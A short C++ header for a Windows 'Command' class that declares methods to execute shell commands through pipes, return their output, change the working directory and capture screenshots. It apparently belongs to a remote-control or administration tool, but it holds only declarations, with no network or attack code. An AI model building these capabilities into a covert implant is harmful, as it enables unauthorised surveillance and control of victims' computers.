#pragma once
#include <windows.h>
#include <atlimage.h>
#include <windows.h>
#include <gdiplus.h>
#include <synchapi.h>
#include <iostream>
#include <vector>
#include <tchar.h>
#include <filesystem>
#include <exception>
#pragma comment (lib,"Gdiplus.lib")

#include <fstream>

class Command
{
	// TODO: refactor this class
	//       create method to return current path
private:
	std::vector<char> output;
	bool Pipe2Buffer(HANDLE& h_OUT_RD);
	bool PipeInit(HANDLE& h_OUT_RD, HANDLE& h_OUT_WR);

public:
	Command() { };
	bool Execute(std::string cmd);
	const std::string GetOutput() const;
	const std::string GetCurrentDir() const;
	const bool SetCurrentDir(std::string& path) const;
	void TakeScreenshot(std::vector<BYTE>& imageBytes);
};

